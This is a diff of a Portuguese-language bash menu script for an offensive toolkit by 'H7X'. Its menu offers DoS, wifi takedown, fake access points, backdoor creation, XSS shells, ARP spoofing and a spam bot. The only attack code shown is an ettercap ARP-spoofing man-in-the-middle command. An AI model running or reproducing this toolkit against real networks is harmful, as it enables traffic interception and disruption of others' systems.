@@ -1,32 +1,24 @@
 #!/bin/bash
-#ferramenta feita por H7X
 
 clear
 
-echo "      #############"
-echo "    ##############*##"
-echo "   ################**#"
-echo "  ########  #  ####***#"
-echo " ########       ###****#"
-echo "##########     ####*****#"
-echo "####   ##### #####   ***#"
-echo "###      #######      **#"
-echo "###   X   #####   X   **#"
-echo "####     ## # ##     ***#"
-echo "########## ### ##*******#"
-echo " ### ############**# ###"
-echo "     ##-#-#-#-#-#-##"
-echo "      | | | | | | |"
-echo "V:1.8"
+cat banner.txt
+
+sleep 0.70
+
 menu="
-{0} sair do script
-{1} consultar cep 				{7} Ataque Dos
-{2} Rastrear ip					{8} Derrubar Wifi
-{3} Ativar modo monitor				{9} criar rede wifi fake
-{4} Shell em XSS				{10} Criar backdoor automaticamente
-{5} Descriptografar MD5				{11} arp_spoof
+{0} sair do script 				{7} Ataque Dos
+{1} consultar cep				{8} Derrubar Wifi
+{2} Rastrear ip					{9} criar rede wifi fake
+{3} Ativar modo monitor				{10} Criar backdoor automaticamente
+{4} Shell em XSS				{11} arp spoofing
+{5} Descriptografar MD5				{12} Atualizar script
 {6} Spam-Bot
 "
+
+echo "By: H7X"
+echo "Github: https://github.com/H7XX"
+echo "Youtube: https://www.youtube.com/channel/UCKHc3Id634qWSrZ_vbQKGTQ"
 echo "$menu"
 
 read -p "Escolha uma opção >> " opcao
@@ -110,6 +102,11 @@ proteção https"
 		echo "Iniciando ataque..."
 		echo "precione {Ctrl c} para parar o ataque"
 		ettercap -T -q -i $arpiface -P arp_spoof -M arp /$iparp//
+	;;
+
+	12)
+		clear
+		update=bash atualizar.sh
 	;;
 
 	*)
